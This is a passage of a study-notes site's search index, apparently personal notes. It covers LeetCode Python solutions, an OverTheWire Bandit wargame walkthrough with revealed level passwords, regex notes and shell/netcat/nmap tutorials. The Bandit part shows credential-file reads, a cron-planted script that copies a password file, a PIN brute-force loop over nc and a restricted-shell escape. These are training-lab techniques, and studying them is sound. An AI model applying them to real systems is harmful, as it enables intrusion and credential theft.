   return x == rev or x == rev // 10\n</code></pre>"},{"location":"leetcode/leetcode/#longestconsecutive","title":"longestConsecutive","text":"<p><code>set</code>, <code>map</code> are implemented as hash tables time complexity for searching and inserting are \\(O(1)\\) <pre><code>class Solution(object):\n    def longestConsecutive(self, nums):\n        \"\"\"\n        :type nums: List[int]\n        :rtype: int\n        \"\"\"\n        num_set = set(nums)\n        max_len = 0\n        for num in num_set:\n            if num - 1 not in num_set:\n                length = 1 \n                target = num + 1\n                while target in num_set:\n                    length, target = length + 1, target + 1\n                max_len = max(max_len, length)\n        return max_len\n</code></pre></p>"},{"location":"leetcode/leetcode/#movezeros","title":"moveZeros","text":"<p>\u627e\u5230 0 \uff0c\u5220\u6389\uff0c\u672b\u5c3e\u52a0\u4e00\u4e2a 0 \u00d7 <pre><code>if nums[i] == 0:\nnums.pop(i)\nnums.append(0)\n</code></pre> \u4fee\u6539\u6b63\u5728\u904d\u5386\u7684\u6570\u7ec4\u5f88\u5371\u9669 \u2192 \u627e\u5230\u6240\u6709 0 \u7684\u4f4d\u7f6e\u540e\u5220\u9664 <pre><code>nums.pop(zeros[zero - i])\n</code></pre> bad space complexity </p> <p>\u79fb\u52a8\u7a97\u53e3\u548c\u53cc\u6307\u9488\uff1a \u4ea4\u6362 0 block \u7684\u7b2c\u4e00\u4e2a 0 \u548c 0 block \u4e4b\u540e\u7684\u7b2c\u4e00\u4e2a\u975e 0 \u6570 time complexity of swap: \\(O(1)\\)\uff0c\u4e0d\u4f1a\u5f71\u54cd\u603b\u4f53\u65f6\u95f4\u590d\u6742\u5ea6</p> <pre><code>class Solution(object):\n    def moveZeroes(self, nums):\n        \"\"\"\n        :type nums: List[int]\n        :rtype: None Do not return anything, modify nums in-place instead.\n        \"\"\"\n        left = right = 0\n        while right &lt; len(nums):\n            if nums[right] == 0 and nums[left] != 0:\n                left = right\n            if nums[right] != 0:\n                nums[left], nums[right] = nums[right], nums[left]\n                left += 1\n            right += 1\n</code></pre>"},{"location":"leetcode/leetcode/#maxarea","title":"maxArea","text":"<p>Try to use two-pointers. Set one pointer to the left and one to the right of the array. Always move the pointer that points to the lower line.</p> <p>\u5229\u7528\u4e00\u4e9b\u6027\u8d28\u7b5b\u9009\u51fa\u6240\u6709\u53ef\u80fd (\\(O(N^2)\\)) \u4e2d\u7684\u4e00\u90e8\u5206 <pre><code>class Solution(object):\n    def maxArea(self, height):\n        \"\"\"\n        :type height: List[int]\n        :rtype: int\n        \"\"\"\n        left = 0\n        right = len(height) - 1\n        max_water = 0\n        while left &lt; right:\n            water = (right - left) * min(height[left], height[right])\n            if water &gt; max_water:\n                max_water = water\n            if height[left] &lt; height[right]:\n                left = left + 1\n            else:\n                right = right - 1\n        return max_water\n</code></pre></p>"},{"location":"linux/bandit/","title":"Bandit","text":""},{"location":"linux/bandit/#level0","title":"level0","text":"<p><pre><code>cat readme\n</code></pre> ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If</p>"},{"location":"linux/bandit/#level1","title":"level1","text":"<p>weird file name <pre><code>cat ~/-\n</code></pre> 263JGJPfgU6LtdEvgfWU1XP5yac29mFx</p>"},{"location":"linux/bandit/#level2","title":"level2","text":"<p>space in file name <pre><code>cat ~/--spaces\\ in\\ this\\ filename--\n</code></pre> MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx</p>"},{"location":"linux/bandit/#level3","title":"level3","text":"<p>dot in file name  <pre><code>cd inhere\nls -a \ncat ./...Hiding-From-You\n</code></pre> 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ</p>"},{"location":"linux/bandit/#level4","title":"level4","text":"<p>file information <pre><code>file ./*\ncat ./-file07\n</code></pre> 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw</p>"},{"location":"linux/bandit/#level5","title":"level5","text":"<p>file filter <pre><code>cd inhere\nfind . -type f -size 1033c\ncat maybehere07/.file2\n</code></pre> HWasnPhtq9AVKe0dmk45nxy20cvUa6EG</p>"},{"location":"linux/bandit/#level6","title":"level6","text":"<p>file filter <pre><code>find / -type f -size 33c -user bandit7 -group bandit6 | grep password\ncat /var/lib/dpkg/info/bandit7.password\n</code></pre> morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj</p>"},{"location":"linux/bandit/#level7","title":"level7","text":"<p><pre><code>cat data.txt | grep millionth\n</code></pre> dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc</p>"},{"location":"linux/bandit/#level8","title":"level8","text":"<p><pre><code>sort data.txt | uniq -u\n</code></pre> 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM</p>"},{"location":"linux/bandit/#lebel9","title":"lebel9","text":"<p><code>strings</code> - print the sequences of printable characters in files <pre><code>strings data.txt\n</code></pre> FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey</p>"},{"location":"linux/bandit/#level10","title":"level10","text":"<p>base64 <pre><code>base64 -d data.txt\n</code></pre> dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr</p>"},{"location":"linux/bandit/#level11","title":"level11","text":"<p>Rot13 <code>tr</code>: translate or delete characters</p> <p><pre><code>cat data.txt | tr \"a-zA-Z\" \"n-za-mN-ZA-M\"\n</code></pre> 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4</p>"},{"location":"linux/bandit/#level12","title":"level12","text":"<ul> <li> <p>hexdump <code>xxd</code>: make a hex dump or do the reverse</p> </li> <li> <p>file compression</p> </li> <li><code>gzip</code> </li> <li><code>bzip2</code></li> <li><code>tar</code></li> <li>... <pre><code>xxd -r data.txt\nfile data.txt   # gzip\nmv data.txt data.gz\ngzip -d data.gz\nfile data.out   # bzip2\nmv data.out data.bz2\nbzip2 -d data.bz2\nfile data   # POSIX tar archive (GNU)\nmv data data.tar\ntar -xf data.tar \n...\n</code></pre> FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn</li> </ul>"},{"location":"linux/bandit/#level13","title":"level13","text":"<p><code>ssh -i</code>: identity_file Selects a file from which the identity (private key) for public key authentication is read. <pre><code>ssh -i ./sshkey.private bandit14@localhost -p 2220\ncat /etc/bandit_pass/bandit14\n</code></pre> MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS</p>"},{"location":"linux/bandit/#level14","title":"level14","text":"<p><code>nc</code>: arbitrary TCP and UDP connections and listens <pre><code>nc localhost 30000\n</code></pre> 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo</p>"},{"location":"linux/bandit/#level15","title":"level15","text":"<p><code>openssl</code>: OpenSSL command line program</p> <p>OpenSSL is a cryptography toolkit implementing the Secure Sockets Layer (SSL v2/v3) and Transport Layer Security (TLS v1) network protocols and related cryptography standards required by them. The openssl program is a command line program for using the various cryptography functions of OpenSSL's crypto library from the shell.  It can be used for</p> <p>o  Creation and management of private keys, public keys and parameters o  Public key cryptographic operations o  Creation of X.509 certificates, CSRs and CRLs o  Calculation of Message Digests and Message Authentication Codes o  Encryption and Decryption with Ciphers o  SSL/TLS Client and Server Tests o  Handling of S/MIME signed or encrypted mail o  Timestamp requests, generation and verification</p> <p><pre><code>openssl s_client -connect localhost:30001\n</code></pre> kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx</p>"},{"location":"linux/bandit/#level16","title":"level16","text":"<p><code>nmap</code>: Network exploration tool and security / port scanner <code>ncat</code>: Concatenate and redirect sockets <pre><code>nmap -sV localhost -p 31000-32000\n# several open ports, 2 ssl \nncat --ssl localhost 31790\n# submit password -&gt; private key in /tmp/key/private.key\nssh -i /tmp/key/private.key bandit17@localhost -p 2220\n</code></pre></p>"},{"location":"linux/bandit/#level17","title":"level17","text":"<p><code>diff</code>: compare files line by line <pre><code>diff passwords.new passwords.old\n</code></pre> x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO</p>"},{"location":"linux/bandit/#level18","title":"level18","text":"<p>executing commands remotely <pre><code>ssh bandit18@bandit.labs.overthewire.org -p 2220 \"cat ./readme\"\n</code></pre> cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8</p>"},{"location":"linux/bandit/#level19","title":"level19","text":"<p>setuid: set user ID <pre><code>./bandit20-do cat /etc/bandit_pass/bandit20\n</code></pre> 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO</p>"},{"location":"linux/bandit/#level20","title":"level20","text":"<p><code>nc -l</code>: Listen for an incoming connection <pre><code>echo \"0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO\" | nc -l 1234 &amp;\n# echo: send to pipe immediately, but not send to the port until connected\n# listen on local port 1234\n./suconnect 1234\n# connect local port 1234 \n</code></pre> EeoULMCra2q0dSkYj561DX7s1CpBuOBt</p>"},{"location":"linux/bandit/#level21","title":"level21","text":"<p><code>cron</code>: daemon to execute scheduled commands</p> <p><pre><code>ls /etc/cron.d\ncat cronjob_bandit22\ncat ...\n</code></pre> tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q</p>"},{"location":"linux/bandit/#level22","title":"level22","text":"<p><pre><code>cat cronjob_bandit23\n# #!/bin/bash\n\n# myname=$(whoami)\n# mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)\n\n# echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"\n\n# cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget\necho I am uer bandit23 | md5sum | sut -d ' ' -f 1\n# 8ca319486bfbbc3663ea0fbe81326349\ncat /tmp/8ca319486bfbbc3663ea0fbe81326349\n</code></pre> 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga</p>"},{"location":"linux/bandit/#level23","title":"level23","text":"<p><pre><code>$ cat cronjob_bandit24\n$ cat /usr/bin/cronjob_bandit24.sh\n</code></pre> <pre><code>#!/bin/bash\n\nmyname=$(whoami)\n\ncd /var/spool/$myname/foo\necho \"Executing and deleting all scripts in /var/spool/$myname/foo:\"\nfor i in * .*;\ndo\n    if [ \"$i\" != \".\" -a \"$i\" != \"..\" ];\n    then\n        echo \"Handling $i\"\n        owner=\"$(stat --format \"%U\" ./$i)\"\n        if [ \"${owner}\" = \"bandit23\" ]; then\n            timeout -s 9 60 ./$i\n        fi\n        rm -f ./$i\n    fi\ndone\n</code></pre> <pre><code>$ vim /tmp/getpassword.sh\n</code></pre> <pre><code>#!/bin/bash \n\ncat /etc/bandit_pass/bandit24 &gt; /tmp/pw.txt\n</code></pre> <pre><code>$ chmod +x  /tmp/getpassword.sh\n$ cp /tmp/getpassword.sh /var/spool/bandit24/foo\n$ cat /tmp/pw.txt\n</code></pre> gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8</p>"},{"location":"linux/bandit/#level24","title":"level24","text":"<p>boom <pre><code>#!/bin/bash\n\nfor i in {0000..9999}\ndo\n        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i &gt;&gt; possibilities.txt\ndone\n\ncat possibilities.txt | nc localhost 30002 &gt; result.txt\n</code></pre> <pre><code>$ cat result.txt | grep -v Wrong    # -v: invert matching \n</code></pre> iCi86ttT4KSNe1armKiwbQNmB3YJP3q4</p>"},{"location":"linux/bandit/#level25","title":"level25","text":"<p><code>/etc/passwd</code>: stores the basic information of all users <pre><code>$ cat /etc/passwd | grep bandit26   # check shell\nbandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext\n# user name:password:uid:gid:comment:home directory:shell\n$ cat /usr/bin/showtext\n#!/bin/sh\n\nexport TERM=linux\n\nmore ~/text.txt # we should stop here\nexit 0  # !!!\n$\n</code></pre> <code>more</code>:  file perusal filter for crt viewing hidden feature: type <code>v</code> will call the defualt editor </p> <p><pre><code># first shrink the terminal interface\n$ ssh -i ./bandit26.sshkey bandit26@localhost -p 2220\n# page viewing, type v\n:set shell=/bin/bash    # command mode\n:shell  # call shell (bash)\ncat /etc/bandit_pass/bandit26\n</code></pre> s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ</p>"},{"location":"linux/bandit/#level26","title":"level26","text":"<p><pre><code>./bandit27-do cat /etc/bandit_pass/bandit27\n</code></pre> upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB</p>"},{"location":"linux/bandit/#level27","title":"level27","text":"<p><pre><code>git clone ssh://bandit27-git@localhost/home/bandit27-git/repo\n</code></pre> Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN</p>"},{"location":"linux/bandit/#level28","title":"level28","text":"<p>version <pre><code>mkdir /tmp/git-bandit28\ncd /tmp/git-bandit28\ngit clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo # add port!\ncat README.md\n# password: xxxxx\ngit log\n# versions shown\ngit checkout 68314e012fbaa192abfc9b78ac369c82b75fab8f\ncat README.md\n</code></pre> 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7</p>"},{"location":"linux/bandit/#level29","title":"level29","text":"<p>branch <pre><code>git branch -a\ngit checkout dev\ncat README.md\n</code></pre> qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL</p>"},{"location":"linux/bandit/#level30","title":"level30","text":"<p>tag <pre><code>git tag\ngit show secret\n</code></pre> fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy</p>"},{"location":"linux/bandit/#level31","title":"level31","text":"<p>add -&gt; commit -&gt; push <pre><code>echo \"May I come in?\" &gt; key.txt\ngit add -f key.txt\ngit commit -m \"key\"\ngit push origin master\n</code></pre> 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K</p>"},{"location":"linux/bandit/#level32","title":"level32","text":"<p><code>$0</code> - Name of the script <pre><code># UPPER SHELL\n$0\ncat /etc/bandit_pass/bandit33\n</code></pre> tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0</p>"},{"location":"linux/regular%20expression/","title":"Regular Expression","text":""},{"location":"linux/regular%20expression/#regular_expression","title":"Regular Expression","text":"<p>debugger https://regex101.com/r/qqbZqh/2</p> <p>toturial https://regexone.com/problem/matching_html</p> <p>Regular expressions are extremely useful in extracting information from text such as code, log files, spreadsheets, or even documents. </p>"},{"location":"linux/regular%20expression/#metacharacters","title":"Metacharacters","text":"<p><code>abc\u2026</code>  Letters <code>123\u2026</code>  Digits</p> <p><code>\\d</code>    Any Digit <code>\\D</code>    Any Non-digit character</p> <p><code>.</code> Any Character \u2192 (escape) <code>\\.</code> Period</p> <p><code>[abc]</code> Only a, b, or c <code>[^abc]</code>    Not a, b, nor c <code>[a-z]</code> Characters a to z <code>[0-9]</code> Numbers 0 to 9 <code>[^n-p]</code>  character except for letters n to p</p> <p><code>\\w</code>    Any Alphanumeric character equivalent to the character range [A-Za-z0-9_]</p> <p><code>\\W</code>    Any Non-alphanumeric character</p> <p><code>\\b</code> the boundary between a word and a non-word character.  - It's most useful in capturing entire words (for example by using the pattern \\w+\\b)</p> <p><code>{m}</code>   m Repetitions <code>{m,n}</code> m to n Repetitions - a{3} - [^1-9]{2,6} - .{1,3}</p> <p><code>*</code> Zero or more repetitions <code>+</code> One or more repetitions - .* - aa+bc+ - (,\\d+)</p> <p><code>*</code> and <code>+</code> are, by default, \"greedy\". They will match as much text as they can.  - ^.*: ab:cde:f</p> <p><code>?</code> Optional character \u2192 (escape) <code>\\?</code> Question mark -  ab?c : match either the strings \"abc\" or \"ac\" because the b is considered optional</p> <p><code>\\s</code>    Any Whitespace</p> <p>The most common forms of whitespace you will use with regular expressions are the space (<code>\u2423</code>), the tab (<code>\\t</code>), the new line (<code>\\n</code>) and the carriage return (<code>\\r</code>) (useful in Windows environments), and these special characters match each of their respective whitespaces. In addition, a whitespace special character <code>\\s</code> will match any of the specific whitespaces above and is extremely useful when dealing with raw input text. <code>\\S</code>    Any Non-whitespace character</p> <p>It is often best practice to write as specific regular expressions as possible to ensure that we don't get false positives when matching against real world text. e.g. We wanted to match the word \"success\" in a log file. We certainly don't want that pattern to match a line that says \"Error: unsuccessful operation\"! <code>^\u2026$</code>   Starts and ends - ^succuss</p> <p>Note that this is different than the hat used inside a set of bracket [^...] for excluding characters</p> <p>Regular expressions allow us to not just match text but also to extract information for further processing.  <code>(\u2026)</code>   Capture Group - ^(IMG\\d+.png)$ captures and extracts the full filename - ^(IMG\\d+).png$ captures the part before the period.</p> <p><code>(a(bc))</code>   Capture Sub-group - ^(IMG(\\d+)).png$</p> <p>Generally, the results of the captured groups are in the order in which they are defined (in order by open parenthesis).</p> <p><code>(.*)</code>  Capture all</p> <p>Specifically when using groups, you can use the <code>|</code> (logical OR, aka. the pipe) to denote different possible sets of characters. <code>(abc|def)</code> Matches abc or def</p> <p>back referencing Many systems allow you to reference your captured groups by using \\0 (usually the full matched text), \\1 (group 1), \\2 (group 2), etc.</p>"},{"location":"linux/regular%20expression/#examples","title":"Examples","text":"<p>Matching decimal numbers</p> <p>3.14529 -255.34  128  1.9e10 123,340.00 <pre><code>^-?\\d+(,\\d+)*(\\.\\d+(e\\d+)?)?$\n</code></pre> Matching phone numbers</p> <p>Task    Text    Capture Groups  capture 415-555-1234    415 capture 650-555-2345    650 capture (416)555-3456   416  capture 202 555 4567    202 capture 4035555678  403 capture 1 416 555 9292  416 <pre><code>1?[\\s-]?\\(?(\\d{3})\\)?[\\s-]?\\d{3}[\\s-]?\\d{4}\n</code></pre></p> <p>Matching emails</p> <p>Task    Text    Capture Groups  capture tom@hogwarts.com    tom capture tom.riddle@hogwarts.com tom.riddle  capture tom.riddle+regexone@hogwarts.com    tom.riddle  capture tom@hogwarts.eu.com tom capture potter@hogwarts.com potter  capture harry@hogwarts.com  harry   capture hermione+regexone@hogwarts.com  hermione</p> <p><pre><code>^([\\w\\.]*)\n</code></pre> It will match up to the point in the text where it reaches an '@' or '+'.</p>"},{"location":"linux/shell/","title":"shell","text":""},{"location":"linux/shell/#cli","title":"CLI","text":""},{"location":"linux/shell/#terminal","title":"Terminal","text":"<p>\"end point of a railway line,\" 1888, from terminal (adj.);  sense of \"device for communicating with a computer\" is first recorded 1954.  Earlier \"final part of a word\" (1831).</p>"},{"location":"linux/shell/#the_shell","title":"the Shell","text":"<p>Computers these days have a variety of interfaces for giving them commands; fanciful graphical user interfaces, voice interfaces, and even AR/VR are everywhere. These are great for 80% of use-cases, but they are often fundamentally restricted in what they allow you to do.  To take full advantage of the tools your computer provides, we have to go old-school and drop down to a textual interface: The Shell.</p>"},{"location":"linux/shell/#environment_variable","title":"Environment Variable","text":""},{"location":"linux/shell/#shell_command","title":"Shell Command","text":""},{"location":"linux/shell/#permission_management","title":"Permission Management","text":"<p>Permission Types - read \u00ae - write (w) - execute (or  search  for directories)  (x) - execute/search only if the file is a directory or already has execute permission for some user (X) - set user or group ID on execution (s)   - \u200b\u200bSet User ID (SUID - sor 4):\u200b\u200b When set on an executable, it runs with the permissions of the file's owner, not the user who executed it. (e.g., /usr/bin/passwd).   - \u200bSet Group ID (SGID - sor 2):\u200b\u200b   On an executable: runs with the group's permissions.   On a directory: new files created inside inherit the directory's group.</p> <p>Viewing Permissions</p> <p><code>ls -l</code> <pre><code>$ ls -l important_document.txt\n-rwxr-xr-- 1 alice developers 2048 Sep 12 10:00 important_document.txt\n</code></pre> - 1<sup>st</sup> character (-):\u200b\u200b File type (-= regular file, d= directory, l= symbolic link). - \u200b2-4 chars (rwx):\u200b\u200b Permissions for the \u200b\u200buser (owner)\u200b\u200b. - \u200b5-7 chars (r-x):\u200b\u200b Permissions for the \u200b\u200bgroup\u200b\u200b. - 8-10 chars (r--):\u200b\u200b Permissions for \u200b\u200bothers\u200b\u200b.</p> <p>Changing Permissions</p> <p><code>chmod</code> - change file mode bits</p> <p>symbolic representation: [ugoa...][[-+=][perms...]...]</p> <p><code>ugoa</code> controls which users' access to the file will be changed   - <code>u</code>: user / owner   - <code>g</code>: group   - <code>o</code>: others   - <code>a</code>: all (default)</p> <p><code>perms</code> is either zero or more letters from the set <code>rwxXst</code>, or a single letter from the set <code>ugo</code>.</p> <ul> <li>restricted deletion flag or sticky bit --  Applied to a directory, it restricts file deletion. Only the file owner, directory owner, or root can delete files within it (e.g., /tmp). (t)</li> </ul> <p>octal number representation derived by adding up the bits with values 4 (read), 2 (write), and 1 (execute) - The first digit selects the set user ID (4) and set group ID (2) and restricted deletion or sticky (1) attributes. - The second: owner - The third: group - The fourth: other users </p> <p><code>chown</code> - change file owner and group <pre><code>chown [OPTION]... [OWNER][:[GROUP]] FILE...\n</code></pre> If a colon but  no  group name follows the user name, that user is made the owner of the files and the group of the files is changed to that user's login group.</p> <p><code>chgrp</code> - change group ownership <pre><code>chgrp [OPTION]... GROUP FILE...\n</code></pre> Change the group of each FILE to GROUP. <pre><code>chgrp [OPTION]... --reference=RFILE FILE...\n</code></pre> Change the group of each FILE to that of RFILE.</p>"},{"location":"linux/shell/#data_wrangling","title":"Data Wrangling","text":"<p><code>sed</code> - stream editor for filtering and transforming text <pre><code>sed [OPTION]... {script-only-if-no-other-script} [input-file]...\n</code></pre> -E, -r, --regexp-extended use extended regular expressions in the script (for portability use POSIX -E).</p> <p>Substitute (Replace) Text (s/)\u200b <pre><code>sed 's/old/new/' file.txt   #Replace the \u200b\u200bfirst occurrence\u200b\u200b of a pattern per line\nsed 's/old/new/g' file.txt  # Replace all occurrences\u200b\u200b (global)\nsed 's/hello/HELLO/i' file.txt  # \u200b\u200bCase-insensitive replacement\u200b\n</code></pre> Delete Lines (/d)\u200b <pre><code>sed '/pattern/d' file.txt\n</code></pre></p> <p><code>awk</code> is a programming language that just happens to be really good at processing text streams.  <pre><code>awk '{print $2}'\nawk '$1 == 1 &amp;&amp; $2 ~ /^c[^ ]*e$/ { print $2 }'\n</code></pre></p> <p><code>paste</code> - merge lines of files <pre><code>paste [OPTION]... [FILE]...\n</code></pre> -d, --delimiters=LIST reuse characters from LIST instead of TABs (by default)</p> <p>-s, --serial paste one file at a time instead of in parallel</p> <p>-z, --zero-terminated line delimiter is NUL, not newline</p> <p><code>wc</code> - print newline, word, and byte counts for each file</p> <p>-c, --bytes print the byte counts</p> <p>-m, --chars print the character counts</p> <p>-l, --lines print the newline counts</p> <p><code>sort</code> - sort lines of text files <pre><code>sort [OPTION]... [FILE]...\n</code></pre> -r, --reverse reverse the result of comparisons</p> <p><code>uniq</code> - report or omit repeated lines</p> <pre><code>uniq [OPTION]... [INPUT [OUTPUT]]\n</code></pre> <p>-i, --ignore-case ignore differences in case when comparing</p> <p>-s, --skip-chars=N avoid comparing the first N characters</p> <p>-w, --check-chars=N compare no more than N characters in lines</p> <p>-c, --count prefix lines by the number of occurrences</p> <p>-d, --repeated only print duplicate lines, one for each group</p> <p>-u, --unique only print unique lines</p> <p><code>nc</code> \u2014 arbitrary TCP and UDP connections and listens The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets.</p> <p>CLIENT/SERVER MODEL On one console, start nc listening on a specific port for a connection. <pre><code>$ nc -l 1234\n</code></pre> On a second console (or a second machine), connect to the machine and port being listened on: <pre><code>$ nc -N 127.0.0.1 1234  # -N: shutdown(2) the network socket after EOF on the input.\n</code></pre> There should now be a connection between the ports.  Anything typed at the second console will be concatenated to the first, and vice-versa. After the connection has been set up, nc does not really care which side is being used as a \u2018server\u2019 and which side is being used as a \u2018client\u2019. </p> <p>DATA TRANSFER</p> <p>Start by using nc to listen on a specific port, with output captured into a file: <pre><code>$ nc -l 1234 &gt; filename.out\n</code></pre> Using a second machine, connect to the listening nc process, feeding it the file which is to be transferred: <pre><code>$ nc -N host.example.com 1234 &lt; filename.in\n</code></pre> After the file has been transferred, the connection will close automatically.</p> <p>TALKING TO SERVERS</p> <p>For example, to retrieve the home page of a web site: <pre><code>$ printf \"GET / HTTP/1.0\\r\\n\\r\\n\" | nc host.example.com 80\n</code></pre></p> <p>PORT SCANNING</p> <pre><code>$ nc -zv host.example.com 20-30\nConnection to host.example.com 22 port [tcp/ssh] succeeded!\nConnection to host.example.com 25 port [tcp/smtp] succeeded!\n</code></pre> <p><code>nmap</code> (\u201cNetwork Mapper\u201d) - Network exploration tool and security / port scanner <pre><code>nmap [Scan Type...] [Options] {target specification}\n</code></pre></p> <p>TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: <code>scanme.nmap.org</code>, <code>microsoft.com/24</code>, 192.168.0.1; 10.0.0-255.1-254</p> <p>HOST DISCOVERY: -sn: Ping Scan - disable port scan</p> <p>PORT SPECIFICATION AND SCAN ORDER: -p \\&lt;port ranges&gt;: Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</p> <p>SCAN TECHNIQUES: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sN/sF/sX: TCP Null, FIN, and Xmas scans -sU: UDP Scan</p> <p>OS DETECTION: -O: Enable OS detection</p> <p>SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info</p> <p><code>hashcat</code> - Advanced CPU-based password recovery utility</p> <pre><code>hashcat [options] hashfile [mask|wordfiles|directories]\n</code></pre> <p>Hashcat is the world\u2019s fastest CPU-based password recovery tool.</p> <p>As we covered in the lecture find's -exec can be very powerful for performing operations over the files we are searching for. However, what if we want to do something with all the files, like creating a zip file? As you have seen so far commands will take input from both arguments and STDIN. When piping commands, we are connecting STDOUT to STDIN, but some commands like tar take inputs from arguments. To bridge this disconnect there's the xargs command which will execute a command using STDIN as arguments. For example ls | xargs rm will delete the files in the current directory.</p> <p>finds all HTML files in the folder and makes a zip with them <pre><code>find . -type f -name \"*.html\" | xargs -d '\\n' tar -cvzf archive.tar.gz \n</code></pre></p>"},{"location":"linux/shell/#globbing","title":"Globbing","text":"<ul> <li>Wildcards</li> <li><code>*</code>: expand 0 or more characers</li> <li><code>?</code>: expand exactly 1 character</li> <li>Curly braces <code>{}</code></li> </ul> <pre><code>convert image.{png,jpg}\n# Will expand to\nconvert image.png image.jpg\n\ncp /path/to/project/{foo,bar,baz}.sh /newpath\n# Will expand to\ncp /path/to/project/foo.sh /path/to/project/bar.sh /path/to/project/baz.sh /newpath\n\n# Globbing techniques can also be combined\nmv *{.py,.sh} folder\n# Will move all *.py and *.sh files\n\n\nmkdir foo bar\n# This creates files foo/a, foo/b, ... foo/h, bar/a, bar/b, ... bar/h\ntouch {foo,bar}/{a..h}\ntouch foo/x bar/y\n# Show differences between files in foo and bar\ndiff &lt;(ls foo) &lt;(ls bar)\n# Outputs\n# &lt; x\n# ---\n# &gt; y\n</code></pre>"},{"location":"linux/shell/#shell_function","title":"Shell Function","text":"<p>Functions are executed in the current shell environment. Thus, they can modify environment variables.</p> <pre><code>mcd () {\n    mkdir -p \"$1\"\n    cd \"$1\"\n    export VAR=$(pwd)   # export environment variable\n}\n</code></pre>"},{"location":"linux/shell/#script","title":"Script","text":""},{"location":"linux/shell/#shebang","title":"Shebang","text":"<p>The \u200b\u200bshebang\u200b\u200b (#!) is a special sequence at the \u200b\u200bbeginning of a script file\u200b\u200b that tells the system which interpreter (program) should be used to execute the script. <pre><code>#!/bin/bash\n</code></pre> use the <code>env</code> command that will resolve to wherever the command lives in the system, increasing the portability of scripts <pre><code>#!/usr/bin/env python\n</code></pre></p>"},{"location":"linux/shell/#special_characters","title":"Special Characters","text":"<ul> <li><code>$0</code> - Name of the script</li> <li><code>$1</code> to <code>$9</code> - Arguments to the script. <code>$1</code> is the first argument and so on.</li> <li><code>$@</code> - All the arguments</li> <li><code>$#</code> - Number of arguments</li> <li><code>$?</code> - Return code of the previous command</li> <li><code>$$</code> - Process identification number (PID) for the current script</li> <li><code>!!</code> - Entire last command, including arguments.    A common pattern: <code>sudo !!</code></li> <li><code>$_</code> - Last argument from the last command. If you are in an interactive shell, you can also quickly get this value by typing <code>Esc</code> followed by <code>.</code> or <code>Alt+.</code></li> </ul>"},{"location":"linux/shell/#return_code","title":"Return Code","text":"<p>The return code or exit status is the way scripts/commands have to communicate how execution went. A value of 0 usually means everything went OK; anything different from 0 means an error occurred.</p> <p>Exit codes can be used to conditionally execute commands using <code>&amp;&amp;</code> and <code>||</code>.  Commands can also be separated within the same line using a semicolon <code>;</code>. <pre><code>false || echo \"Oops, fail\"\n# Oops, fail\n\ntrue || echo \"Will not be printed\"\n#\n\ntrue &amp;&amp; echo \"Things went well\"\n# Things went well\n\nfalse &amp;&amp; echo \"Will not be printed\"\n#\n\ntrue ; echo \"This will always run\"\n# This will always run\n\nfalse ; echo \"This will always run\"\n# This will always run\n</code></pre></p>"},{"location":"linux/shell/#command_substitution","title":"Command Substitution","text":"<p>Whenever you place <code>$( CMD )</code> it will execute <code>CMD</code>, get the output of the command and substitute it in place</p>"},{"location":"linux/shell/#control_flow","title":"Control Flow","text":"<pre><code>#!/bin/bash\n\necho \"Starting program at $(date)\" # Date will be substituted\n\necho \"Running program $0 with $# arguments with pid $$\"\n\nfor file in \"$@\"; do\n    grep foobar \"$file\" &gt; /dev/null 2&gt; /dev/null\n    # When pattern is not found, grep has exit status 1\n    # We redirect STDOUT and STDERR to a null register since we do not care about them\n    if [[ $? -ne 0 ]]; then\n        echo \"File $file does not have any foobar, adding one\"\n        echo \"# foobar\" &gt;&gt; \"$file\"\n    fi\ndone\n</code></pre>"},{"location":"linux/shell/#execute","title":"Execute","text":"<pre><code>chmod +x example.sh\n./example.sh [param]\n</code></pre> <pre><code>sh example.sh [param]\n</code></pre>"},{"location":"linux/shell/#shell_functions_vs_scripts","title":"shell functions vs. scripts","text":"<ul> <li>Functions have to be in the same language as the shell, while scripts can be written in any language. This is why including a shebang for scripts is important.</li> <li>Functions are loaded once when their definition is read. Scripts are loaded every time they are executed. This makes functions slightly faster to load, but whenever you change them you will have to reload their definition.</li> <li>Functions are executed in the current shell environment whereas scripts execute in their own process. Thus, functions can modify environment variables, e.g. change your current directory, whereas scripts can't. Environment variables which have been exported using <code>export</code> are passed by value to scripts.</li> <li>As with any programming language, functions are a powerful construct to achieve modularity, code reuse, and clarity 